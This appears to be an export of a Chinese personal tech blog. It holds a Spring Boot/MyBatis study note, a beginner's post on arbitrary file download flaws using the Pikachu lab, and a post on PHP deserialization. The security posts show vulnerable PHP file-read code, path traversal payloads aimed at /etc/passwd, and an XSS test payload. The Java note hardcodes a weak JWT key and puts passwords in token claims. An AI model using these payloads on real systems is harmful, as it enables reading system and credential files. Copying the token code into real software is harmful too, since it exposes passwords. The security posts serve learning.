Controller层请求方法为Delete,@DeleteMapping(&#123;ids&#125;)注解;路径参数ids前加上@PathVariable

@DeleteMapping(&quot;/&#123;ids&#125;&quot;)public Result delete(@PathVariable List&lt;Integer&gt; ids)&#123;    log.info(&quot;批量删除ids:&#123;&#125;&quot;,ids);    empservice.delete(ids);    return Result.success();&#125;

Service层@Overridepublic void delete(List&lt;Integer&gt; ids) &#123;    empMapper.delete(ids);&#125;

Mapper层对应sql:
delete from emp where id in (1,2,3)

xml映射文件中:&lt; foreach &gt;实现对数组的遍历
&lt;delete id=&quot;delete&quot;&gt;    delete from emp where id in    &lt;foreach collection=&quot;ids&quot; item=&quot;id&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt;        #&#123;id&#125;    &lt;/foreach&gt;&lt;/delete&gt;

新增员工接口文档


Controller层//前端发送json请求体，封装为pojo实体类@PostMappingpublic Result save(@RequestBody Emp emp)&#123;    empservice.save(emp);    return Result.success();&#125;

Service层@Overridepublic void save(Emp emp) &#123;    emp.setCreateTime(LocalDateTime.now());    emp.setUpdateTime(LocalDateTime.now());    empMapper.insert(emp);&#125;

Mapper层void insert(Emp emp);

xml映射文件
&lt;insert id=&quot;insert&quot;&gt;        insert into emp (username, name, gender, image, job, entrydate, dept_id,create_time,update_time) values (#						&#123;username&#125;,#&#123;name&#125;,#&#123;gender&#125;,#&#123;image&#125;,#&#123;deptId&#125;,#&#123;entryDate&#125;,#&#123;job&#125;,#&#123;createTime&#125;,#&#123;updateTime&#125;)&lt;/insert&gt;

查询回显接口文档


Contoller层@GetMapping(&quot;/&#123;id&#125;&quot;)public Result getById(@PathVariable Integer id)&#123;    log.info(&quot;查询id:&#123;&#125;&quot;,id);    return Result.success(empService.getById(id));&#125;



Service层@Overridepublic Emp getById(Integer id) &#123;    return empMapper.selectById(id);&#125;



Mapper层@Select(&quot;select* from emp where id=#&#123;id&#125;&quot;)Emp selectById(Integer id);

测试

修改员工接口文档


Contoller层@PutMappingpublic Result update(@RequestBody Emp emp)&#123;    log.info(&quot;要修改的员工:&#123;&#125;&quot;,emp);    empService.update(emp);    return Result.success();&#125;



Service层@Overridepublic void update(Emp emp) &#123;    emp.setUpdateTime(LocalDateTime.now());    empMapper.update(emp);&#125;



Mapper层&lt;update id=&quot;update&quot;&gt;        UPDATE emp        &lt;set&gt;                &lt;if test=&quot;username != null and username != &#x27;&#x27;&quot;&gt;                        username =                        #&#123;username&#125;,                &lt;/if&gt;                &lt;if test=&quot;password != null and password != &#x27;&#x27;&quot;&gt;                        password =                        #&#123;password&#125;,                &lt;/if&gt;                &lt;if test=&quot;name != null and name != &#x27;&#x27;&quot;&gt;                        name =                        #&#123;name&#125;,                &lt;/if&gt;                &lt;if test=&quot;gender != null&quot;&gt;                        gender =                        #&#123;gender&#125;,                &lt;/if&gt;                &lt;if test=&quot;image != null and image != &#x27;&#x27;&quot;&gt;                        image =                        #&#123;image&#125;,                &lt;/if&gt;                &lt;if test=&quot;job != null&quot;&gt;                        job =                        #&#123;job&#125;,                &lt;/if&gt;                &lt;if test=&quot;entryDate != null&quot;&gt;                        entrydate =                        #&#123;entryDate&#125;,                &lt;/if&gt;                &lt;if test=&quot;deptId != null&quot;&gt;                        dept_id =                        #&#123;deptId&#125;,                &lt;/if&gt;                &lt;if test=&quot;createTime != null&quot;&gt;                        create_time =                        #&#123;createTime&#125;,                &lt;/if&gt;                &lt;if test=&quot;updateTime != null&quot;&gt;                        update_time =                        #&#123;updateTime&#125;                &lt;/if&gt;        &lt;/set&gt;        WHERE id = #&#123;id&#125;&lt;/update&gt;

测试
配置文件对比
application.properties
//类中        @Value(&quot;$&#123;aliyun.oss.endpoint&#125;&quot;)        private String endpoint;        @Value(&quot;$&#123;aliyun.oss.bucketName&#125;&quot;)        private String bucketName;        @Value(&quot;$&#123;aliyun.oss.region&#125;&quot;)        private String region;

#配置文件application.propertiesaliyun.oss.endpoint=https://oss-cn-chengdu.aliyuncs.comaliyun.oss.bucketName=k4n9l4naliyun.oss.region=cn-chengdu

调试注入成功

yaml后缀为.yml &#x2F; .yaml

配置文件命名为application.yaml；出现spring图标，说明被识别
写入:
server:  port: 9000

测试:

语法
定义对象&#x2F;MapUser:  name: 淳平  age: 24

定义数组&#x2F;List&#x2F;SetList:  - 114514  - 1919810

改写application.propertiesspring:  application:    name: Spring-Mybatis-demo  #  数据库连接信息  datasource:    driver-class-name: com.mysql.cj.jdbc.Driver    url: jdbc:mysql://localhost:3306/spring_demo    username: root    password: 114514  servlet:    multipart:      max-file-size: 10MB      max-request-size: 100MB#mybatismybatis:  configuration:    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl    map-underscore-to-camel-case: true#aliyun OSSaliyun:  oss:    endpoint: https://oss-cn-chengdu.aliyuncs.com    bucketName: k4n9l4n    region: cn-chengdu

@ConfigurationProperties注解问题分析:配置文件项多了，就有很多成员变量要加上@Value注解，很繁琐

@ConfigurationProperties(prefix = &quot;前缀&quot;)

@Data@Component@ConfigurationProperties(prefix = &quot;aliyun.oss&quot;)public class AliOssProperties &#123;        private String endpoint;        private String bucketName;        private String region;&#125;

@Slf4j@Componentpublic class AliOSSUtils &#123;        @Autowired        private AliOssProperties aliOssProperties;        /**         * 实现上传图片到OSS         */        public String upload(MultipartFile file) throws Exception &#123;                String endpoint = aliOssProperties.getEndpoint();                String bucketName = aliOssProperties.getBucketName();                String region = aliOssProperties.getRegion();        &#125;&#125;

调试

与@Value的区别#@Value只能一个一个注入外部属性#@ConfigurationProperties可以批量注入外部属性到bean对象中

登录登录功能-- 用到的sqlselect* from emp where username = &quot;xxx&quot; and password = &quot;xxx&quot;

接口文档



Controller层@RestController@Slf4j@RequestMapping(&quot;/login&quot;)public class LoginController &#123;        @Autowired        private EmpService empService;        @PostMapping        public Result login(@RequestBody Emp emp)&#123;                log.info(&quot;员工登录:&#123;&#125;&quot;,emp);                Emp e = empService.login(emp);                return e==null?Result.error(&quot;用户名或密码错误&quot;):Result.success();        &#125;&#125;

Service层@Overridepublic Emp login(Emp emp) &#123;    return empMapper.getByUsernameAndPassword(emp);&#125;



Mapper层@Select(&quot;select * from emp where username=#&#123;username&#125; and password = #&#123;password&#125;&quot;)Emp getByUsernameAndPassword(Emp emp);

测试:

校验只这样验证会未授权访问，即使退出登录了，输入原来的url就进入了后台
http是无状态的，请求其他业务时，并不知道用户在登录业务这块到底登录了没有

会话技术
Cookie
@RestController@RequestMapping(&quot;/cookie&quot;)public class CookieController &#123;//        获取cookie        @GetMapping(&quot;/get&quot;)        public Result get(HttpServletRequest request)&#123;                Cookie[] cookies = request.getCookies();                for (Cookie cookie : cookies) &#123;                        if(&quot;test&quot;.equals(cookie.getName()))&#123;                                System.out.println(cookie.toString());                        &#125;                &#125;                return Result.success();        &#125;//        设置cookie        @GetMapping(&quot;/set&quot;)        public Result set(HttpServletResponse response)&#123;                response.addCookie(new Cookie(&quot;test&quot;,&quot;114514&quot;));                return Result.success();        &#125;&#125;

测试:



优缺点
跨域:
三个维度有一个不同就是跨域

Session
@RestController@Slf4j@RequestMapping(&quot;/session&quot;)public class SessionController &#123;        @GetMapping(&quot;/set&quot;)        public Result set(HttpSession session)&#123;                log.info(&quot;Session-ID:&#123;&#125;&quot;,session.hashCode());                session.setAttribute(&quot;Admin&quot;,&quot;Admin&quot;);                return Result.success();        &#125;        @GetMapping(&quot;/get&quot;)        public Result get(HttpServletRequest request)&#123;                HttpSession session = request.getSession();                                log.info(&quot;Session-ID:&#123;&#125;&quot;,session.hashCode());                Object sessionAttribute = session.getAttribute(&quot;Admin&quot;);                return Result.success(sessionAttribute);        &#125;&#125;

测试:
&#x2F;session&#x2F;get

响应的key:

&#x2F;session&#x2F;set

日志输出

优缺点会出现同一个浏览器的两个请求获取到不同的sessionID

令牌
JWT令牌

生成使用的算法

生成jwt的操作
@Testpublic void testGenJWT()&#123;    Map&lt;String,Object&gt; claims = new HashMap&lt;&gt;();    claims.put(&quot;id&quot;,1);    claims.put(&quot;name&quot;,&quot;淳平&quot;);    String jwt = Jwts.builder()        .signWith(SignatureAlgorithm.HS256, &quot;114514&quot;) //算法以及密钥        .addClaims(claims) //自定义内容(Payload)        .setExpiration(new Date(System.currentTimeMillis() + 3600 * 1000)) //设置到期时间，这里设置1h 3600*1000ms        .compact();    System.out.println(jwt);&#125;


将生成的令牌放到官网进行解码

我们只是简单测试一下jwt的生成，可以注释掉SpringBootTest注解，这样就不会加载整个项目

既然生成了，那我们如何解析呢
解析@Testpublic void parseJwt() &#123;        Claims claims = Jwts.parser()                .setSigningKey(&quot;114514&quot;) //密钥                .parseClaimsJws(&quot;&quot;) //前一步生成的令牌,parseClaimsJws千万不要把Jws写错成Jwt                .getBody(); //获取payload部分        System.out.println(claims);&#125;


#JWT校验时用到签名密钥，必须和生成JWT令牌时使用的密钥是配套的#如果JWT令牌解析校验时报错，则JWT令牌被篡改或失效，令牌非法

案例:接口文档

JWT令牌工具类
public class JWTUtils &#123;        private static String signKey = &quot;114514&quot;; //密钥;        private static Long expire = 43200000L; //12h过期        /**         * 生成JWT令牌         * @param claims JWT第二部分负载 payload 中存储的内容         * @return         */        public static String generateJwt(Map&lt;String, Object&gt; claims)&#123;                String jwt = Jwts.builder()                        .addClaims(claims)                        .signWith(SignatureAlgorithm.HS256, signKey)                        .setExpiration(new Date(System.currentTimeMillis() + expire))                        .compact();                return jwt;        &#125;        /**         * 解析JWT令牌         * @param jwt JWT令牌         * @return JWT第二部分负载 payload 中存储的内容         */        public static Claims parseJWT(String jwt)&#123;                Claims claims = Jwts.parser()                        .setSigningKey(signKey)                        .parseClaimsJws(jwt)                        .getBody();                return claims;        &#125;&#125;

LoginController
@RestController@Slf4j@RequestMapping(&quot;/login&quot;)public class LoginController &#123;        @Autowired        private EmpService empService;        @PostMapping        public Result login(@RequestBody Emp emp)&#123;                log.info(&quot;员工登录:&#123;&#125;&quot;,emp);                Emp e = empService.login(emp);                if(e != null)&#123; //用户登录成功                        Map&lt;String,Object&gt; claims = new HashMap&lt;&gt;();                        claims.put(&quot;id&quot;,e.getId());                        claims.put(&quot;username&quot;,e.getUsername());                        claims.put(&quot;password&quot;,e.getPassword());                        claims.put(&quot;name&quot;,e.getName());                        claims.put(&quot;gender&quot;,e.getGender());                        claims.put(&quot;image&quot;,e.getImage());                        claims.put(&quot;job&quot;,e.getJob());                        String jwt = JWTUtils.generateJwt(claims);                        return Result.success(jwt);                &#125;                return Result.error(&quot;用户名或密码错误&quot;);        &#125;&#125;

测试

Filter过滤器

filterdemo
import jakarta.servlet.*;import jakarta.servlet.annotation.WebFilter;import java.io.IOException;@WebFilter(urlPatterns = &quot;/*&quot;) //拦截所有public class FilterDemo implements Filter &#123;        @Override        public void init(FilterConfig filterConfig) throws ServletException &#123;                System.out.println(&quot;init方法执行&quot;);        &#125;        @Override        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                System.out.println(&quot;doFilter方法执行&quot;);        &#125;        @Override        public void destroy() &#123;                System.out.println(&quot;destory方法执行&quot;);        &#125;&#125;

启动类
@ServletComponentScan //要加上这个，因为Filter不是SpringBoot的组件@SpringBootApplicationpublic class SpringMybatisDemoApplication &#123;        public static void main(String[] args) &#123;                SpringApplication.run(SpringMybatisDemoApplication.class, args);        &#125;&#125;

测试
运行

发送请求

拦截到了请求

拦截多次

放行
@Overridepublic void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;        System.out.println(&quot;doFilter方法执行&quot;);        filterChain.doFilter(servletRequest,servletResponse); //使用这个api进行放行数据&#125;

销毁

详解
放行后访问对应web资源后，还会再回到filter中，但是不会从头开始执行filter，从chain.filter后执行（只执行放行后逻辑）
拦截路径
过滤器链
//filter1@WebFilter(urlPatterns = &quot;/*&quot;) //拦截所有public class FilterDemo implements Filter &#123;        @Override        public void init(FilterConfig filterConfig) throws ServletException &#123;                System.out.println(&quot;init方法执行&quot;);        &#125;        @Override        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                System.out.println(&quot;Filter1拦截到请求...放行前&quot;);                filterChain.doFilter(servletRequest,servletResponse);                System.out.println(&quot;Filter1拦截到请求...放行前&quot;);        &#125;        @Override        public void destroy() &#123;                System.out.println(&quot;destory方法执行&quot;);        &#125;&#125;



//filter2@WebFilter(urlPatterns = &quot;/*&quot;)public class FilterDemo2 implements Filter &#123;        @Override        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                System.out.println(&quot;Filter2拦截到请求...放行前&quot;);                filterChain.doFilter(servletRequest,servletResponse);                System.out.println(&quot;Filter2拦截到请求...放行前&quot;);        &#125;&#125;



filterChain的doFilter会将请求&#x2F;响应发送到下一个Filter，如果是最后一个Filter了，就访问web资源&#x2F;响应数据给浏览器
案例-登录校验所有被拦截到的请求都要校验令牌吗?login不用，因为这步人家根本没有令牌
拦截请求后，什么时候才可以放行，执行业务操作?有令牌，且令牌合法，否则返回未登录错误信息

alibaba fastjson：将对象转换为json格式
&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;    &lt;version&gt;1.2.76&lt;/version&gt;&lt;/dependency&gt;

过滤器
@Slf4j@WebFilter(urlPatterns = &quot;/*&quot;)public class WebFilter0 implements Filter &#123;        @Override        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                //1.获取url                HttpServletRequest request = (HttpServletRequest) servletRequest;                HttpServletResponse response = (HttpServletResponse) servletResponse;                StringBuffer url = request.getRequestURL();                //2.排除/login的请求路径                String ext = url.substring(url.lastIndexOf(&quot;/&quot;));                log.info(&quot;请求路径:&#123;&#125;&quot;,ext);                if (&quot;/login&quot;.equals(ext)) &#123;                        log.info(&quot;登陆操作,放行&quot;);                        filterChain.doFilter(servletRequest, servletResponse);                        return;                &#125; else &#123;                        //3.获取请求头中的token                        String jwt = request.getHeader(&quot;token&quot;);                        //4.判断token存在性，不存在，返回未登录                        if (!StringUtils.hasLength(jwt)) &#123; //使用StringUtils工具类判断jwt是否存在                                log.info(&quot;jwt不存在&quot;);                                Result result = Result.error(&quot;NOT_LOGIN&quot;);                                //手动将对象转换为json格式 alibaba fastJson                                String jsonString = JSONObject.toJSONString(result);                                //响应给浏览器                                response.getWriter().write(jsonString);                                return;                        &#125;                        //5.token存在，判断合法性，若不合法，返回未登录                        try &#123;                                Map&lt;String, Object&gt; claims = JWTUtils.parseJWT(jwt);                        &#125; catch (Exception e) &#123;                                e.printStackTrace();                                log.info(&quot;jwt非法&quot;);                                Result result = Result.error(&quot;NOT_LOGIN&quot;);                                //手动将对象转换为json格式 alibaba fastJson                                String jsonString = JSONObject.toJSONString(result);                                //响应给浏览器                                response.getWriter().write(jsonString);                                return;                        &#125;                        //6.放行                        log.info(&quot;令牌校验通过&quot;);                        filterChain.doFilter(servletRequest, servletResponse);                &#125;        &#125;&#125;

测试




Interceptor拦截器类似于Filter，但不同的是，Interceptor是Spring框架提供的

步骤
定义拦截器

@Component //后续需要被注册为beanpublic class InterceptorTest implements HandlerInterceptor &#123;        /**         * 目标资源方法执行前执行         * @param request         * @param response         * @param handler         * @return true:放行      false:不放行         * @throws Exception         */        @Override        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;                System.out.println(&quot;preHandle...&quot;);                return true;        &#125;        /**         * 目标资源方法执行后执行         * @param request         * @param response         * @param handler         * @param modelAndView         * @throws Exception         */        @Override        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;                System.out.println(&quot;postHandle...&quot;);        &#125;        /**         * 视图渲染完毕后执行，最后执行         * @param request         * @param response         * @param handler         * @param ex         * @throws Exception         */        @Override        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;                System.out.println(&quot;afterCompletion...&quot;);        &#125;&#125;

注册拦截器

@Configuration //配置类public class WebConfig implements WebMvcConfigurer &#123;        @Autowired        private InterceptorTest interceptorTest;        @Override        public void addInterceptors(InterceptorRegistry registry) &#123;                registry.addInterceptor(interceptorTest).addPathPatterns(&quot;/**&quot;); //注册拦截所有的拦截器        &#125;&#125;

测试
拦截器中三个方法的顺序

详解拦截路径

@Configuration //配置类public class WebConfig implements WebMvcConfigurer &#123;        @Autowired        private InterceptorTest interceptorTest;        @Override        public void addInterceptors(InterceptorRegistry registry) &#123;                registry.addInterceptor(interceptorTest)                        .addPathPatterns(&quot;/**&quot;) //注册拦截所有路径的拦截器                        .excludePathPatterns(&quot;/login&quot;); //排除拦截/login        &#125;&#125;

拦截流程

与Filter的区别
Filter:实现Filter接口，会拦截所有的资源
Interceptor:实现HandlerInterceptor接口，只会拦截Spring环境内的资源
案例步骤与Filter中一致，不同的是，拦截器是否放行由返回值决定，而过滤器需要手动调用Chain.doFilter()
定义拦截器
@Component@Slf4jpublic class SpringInterceptor implements HandlerInterceptor &#123;        //Controller之前        @Override        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;                //1.获取url                StringBuffer url = request.getRequestURL();                log.info(&quot;url:&#123;&#125;&quot;,url);                String ext = url.substring(url.lastIndexOf(&quot;/&quot;));                //2.排除/login的请求路径                if (&quot;/login&quot;.equals(ext)) &#123;                        log.info(&quot;登陆操作,放行&quot;);                        return true;                &#125;                //3.获取请求头中的token                String jwt = request.getHeader(&quot;token&quot;);                //4.判断token存在性，不存在，返回未登录                if(!StringUtils.hasLength(jwt))&#123;                        log.info(&quot;jwt不存在&quot;);                        Result result = Result.error(&quot;NOT_LOGIN&quot;);                        //手动将对象转换为json格式 alibaba fastJson                        String jsonString = JSONObject.toJSONString(result);                        //响应给浏览器                        response.getWriter().write(jsonString);                        return false;                &#125;                //5.token存在，判断合法性，若不合法，返回未登录                try &#123;                        Map&lt;String, Object&gt; claims = JWTUtils.parseJWT(jwt);                &#125; catch (Exception e) &#123;                        e.printStackTrace();                        log.info(&quot;jwt非法&quot;);                        Result result = Result.error(&quot;NOT_LOGIN&quot;);                        //手动将对象转换为json格式 alibaba fastJson                        String jsonString = JSONObject.toJSONString(result);                        //响应给浏览器                        response.getWriter().write(jsonString);                        return false;                &#125;                //6.放行                log.info(&quot;令牌校验通过&quot;);                return true;        &#125;        @Override        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;                HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);        &#125;        @Override        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;                HandlerInterceptor.super.afterCompletion(request, response, handler, ex);        &#125;&#125;

注册拦截器
@Configuration //配置类public class WebConfig implements WebMvcConfigurer &#123;        @Autowired        private SpringInterceptor springInterceptor;        @Override        public void addInterceptors(InterceptorRegistry registry) &#123;                registry.addInterceptor(springInterceptor)                        .addPathPatterns(&quot;/**&quot;);//注册拦截所有路径的拦截器        &#125;&#125;

测试&#x2F;login

无token进行其他请求

有token且token合法

token非法

异常处理在案例中,如果在新增部门处新增一个重复的部门，由于MySQL对部门这个字段做了unique约束，所以会引发异常

http状态码为500，服务器端异常

响应数据为
&#123;&quot;timestamp&quot;:&quot;2025-06-03T13:46:51.851+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;path&quot;:&quot;/depts&quot;&#125;

并不是我们预先设定的Result格式
&#123;    &quot;code&quot;:    &quot;msg&quot;:&quot;&quot;    &quot;data&quot;:&quot;&quot;&#125;

所以前端无法处理框架抛出的异常


全局异常处理器
@RestControllerAdvicepublic class GlobalExceptionHandler &#123;        @ExceptionHandler(Exception.class)//捕获所有异常        public Result handlerEx(Exception ex)&#123;                ex.printStackTrace();                return Result.error(&quot;操作失败&quot;);        &#125;&#125;

事务管理
在原本的部门管理中，删除部门就仅仅只是把部门删了，但是该部门下的员工却并未删除

@Overridepublic void delete(Integer id) &#123;    mapper.deleteById(id);&#125;

如果我们只是简单加上一个根据部门id删除员工的操作，那么如果这两步操作之间出现了异常，就会导致数据不一致，因此这两步操作需要被封装成一个事务
@Transactional位置:Service层的类&#x2F;方法&#x2F;接口上
作用:将当前方法交给spring进行事务管理，方法执行前，开启事务，成功执行完毕，提交事务，否则回滚事务
我们需要在执行多次数据访问操作的方法上使用，查询不影响数据，单步操作如果失败，也会自动回滚
@Override@Transactionalpublic void delete(Integer id) &#123;    mapper.deleteById(id);    int i = 1/0;//模拟异常    mapper.deleteEmpByDeptId(id);&#125;

控制台输出事务日志
#spring事务管理日志logging:  level:    org.springframework.jdbc.support.JdbcTransactionManager: debug

引发异常

但是数据库中数据未发生变化

控制台日志

rollbackFor@Transactional默认只会回滚RuntimeException及其子类异常，要想回滚其他异常，需要配置rollbackFor属性
//回滚所有异常@Transactional(rollbackFor = Exception.class)

propagationpropagation 属性用于定义事务的传播行为，即指定当前方法在执行时如何与已有的事务交互（例如：是否加入已有事务、是否新建事务等）


案例
记录日志这步要放在finally中，这样就可以无论成功失败都能记录
DeptLog对象
@Data@AllArgsConstructor@NoArgsConstructorpublic class DeptLog &#123;        private LocalDateTime createTime;        private String description;&#125;

Service层
@Servicepublic class DeptLogImpl implements DeptLogService &#123;        @Autowired        private DeptLogMapper deptLogMapper;        @Override        @Transactional        public void insert(DeptLog deptLog) &#123;                deptLogMapper.insert(deptLog);        &#125;&#125;

Mapper层
@Mapperpublic interface DeptLogMapper &#123;        @Insert(&quot;insert into dept_log values (#&#123;createTime&#125;,#&#123;description&#125;)&quot;)        void insert(DeptLog deptLog);&#125;

但是这么做，dept_log表中并不会添加日志
控制台日志中

向dept_log表中插入数据的事务是直接加入到当前删除部门的事务的，所以当删除部门的方法遇到异常回滚时，向dept_log表中插入数据这个动作也回滚了，就没有插入数据
将service层改为
@Servicepublic class DeptLogImpl implements DeptLogService &#123;        @Autowired        private DeptLogMapper deptLogMapper;        @Override        @Transactional(propagation = Propagation.REQUIRES_NEW)        public void insert(DeptLog deptLog) &#123;                deptLogMapper.insert(deptLog);        &#125;&#125;

控制台日志
删除部门的事务被挂起

完成插入日志信息的事务后，再完成删除部门的事务

删除部门回滚

插入数据成功

使用场景
AOPComming soon…
]]></content>
      <categories>
        <category>Web开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>Web开发</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>任意文件下载漏洞学习笔记</title>
    <url>/2024/10/14/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
参考：https://blog.csdn.net/qq_43531669/article/details/116865660
什么是任意文件下载&#x2F;读取？任意文件读取&#x2F;下载漏洞（Arbitrary File Read&#x2F;Download Vulnerability），是指攻击者可以通过某些漏洞，绕过应用程序的限制，直接读取或下载应用程序之外的文件。
这种漏洞通常是由于应用程序没有对用户输入进行充分的验证和过滤而导致的。攻击者可以通过构造恶意的请求来利用该漏洞，从而读取或下载他们本来无权访问的文件，如密码、私钥、证书等，会提供攻击者更多可用信息，提高被入侵的风险。
这里以 Pikachu 靶场的 unsafe filedownload 模块为例：
下载文件后复制下载链接
得到：http://192.168.127.140/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png
filename通过GET方法传入后端
直接看代码

filename传进来后直接拼接在download下了，没有进行过滤，所以引发了任意文件下载&#x2F;读取漏洞
1、漏洞利用条件1. 

存在读文件的函数：
 fopen()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, filesize($file)); // 读取文件内容fclose($fp); // 关闭文件echo $data; // 输出文件内容

 fread()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, 1024); // 读取文件前 1024 字节的内容fclose($fp); // 关闭文件echo $data; // 输出文件内容

 include()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径include($file); // 包含文件并输出内容

 readfile()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径readfile($file); // 读取并输出文件内容

 file_get_context()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file_get_contents($file); // 读取文件内容echo $data; // 输出文件内容

 file()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file($file); // 将文件读入数组中echo implode(&#x27;&#x27;, $data); // 输出文件内容

 2.读取文件的路径用户可控且未校验或校验不严
 3.输出了文件内容


漏洞类型index.php?f=../../../../../../etc/passwdindex.php?f=../index.phpindex.php?f=ﬁle:///etc/passwd

当参数 f 的参数值为php文件时， 若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞。
]]></content>
      <categories>
        <category>Web安全</category>
        <category>任意文件下载漏洞</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>任意文件下载漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化漏洞</title>
    <url>/2025/01/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[反序列化漏洞成因：反序列化unserialize()中接收的字符串可控，通过更改字符串得到想要的对象
php面向对象基础知识php中类和对象的写法class Test&#123;	var $name;//不推荐用var修饰，可以用public,private,protected修饰（与java一致）	var $id;	function __construct($name = null,$id = null)&#123;//构造函数		$this-&gt;name = $name;		$this-&gt;id = $id;	&#125;&#125;class Test&#123;	var $name;	var $id;	function __construct($name = null,$id = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;	&#125;&#125;$a = new Test();$a-&gt;name=&#x27;senpai&#x27;;$a-&gt;id=114514;print_r($a);/*print_r()打印对象实例的结果就是:&gt;Test Object(    [name] =&gt; senpai    [id] =&gt; 114514)[Finished in 852ms]*/

php中构造函数不支持重载，如果想实现无参构造器和有参构造器都存在，要在参数中设置默认值;php访问内部成员用的是$this-&gt;成员变量名
序列化
可以进行序列化的内容：
对象，数组，标量类型（整形，浮点，布尔，字符串），包含资源的数组和对象，null
不能序列化的内容：
类，资源（比如数据库连接），未定义类型

字符串长度用于确定头尾双引号位置，防止出现 &quot;benben&quot;adada&quot;这种中间带有双引号报错的情况

a:参数数量:&#123;i:索引;对应的序列化内容;&#125;


O:类名长度:&quot;类名&quot;:变量数:&#123;s:变量名长度:&quot;变量名&quot;;变量值的序列化内容;&#125;
private属性的成员变量序列化后，变量名前会加上0x00类名0x00(0x00是不可见字符，url编码后就是%00)
protected属性的成员变量序列化后，变量名前会加上0x00*0x00
&lt;?php	class Test&#123;		public $name;		private $id;	&#125;	$a = 1;	$b = &#x27;hello world!&#x27;;	$c = new Test();	$d = [1,2,3,4];	$e = 1.14514;	$f = null;	echo serialize($a).&quot;\n&quot;;	echo serialize($b).&quot;\n&quot;;	echo serialize($c).&quot;\n&quot;;	echo serialize($d).&quot;\n&quot;;	echo serialize($e).&quot;\n&quot;;	echo serialize($f);?&gt;/*i:1;s:12:&quot;hello world!&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;N;s:8:&quot;&lt;0x00&gt;Test&lt;0x00&gt;id&quot;;N;&#125;a:4:&#123;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;&#125;d:1.14514;N;   [Finished in 1.1s]*/



反序列化反序列化就是将字符串变成对象 unserialize(string $str)


例题
get方法传进来的变量benben就是序列化字符串

/*自动把get请求收到的参数拼接到序列化字符串中*/$get = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:&#x27;.strlen($_GET[&#x27;benben&#x27;]).&#x27;:&quot;&#x27;.$_GET[&#x27;benben&#x27;].&#x27;&quot;;&#125;&#x27;;

构造url，用?传递get请求的参数(这里我让他弹窗)
?benben=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:36:&quot;echo &quot;&lt;script&gt;alert(123);&lt;/script&gt;&quot;;&quot;;&#125;
使用var_dump()打印对象细节&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	var_dump($a);?&gt;/*object(Test)#1 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;淳平&quot;  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;   [Finished in 933ms]*/

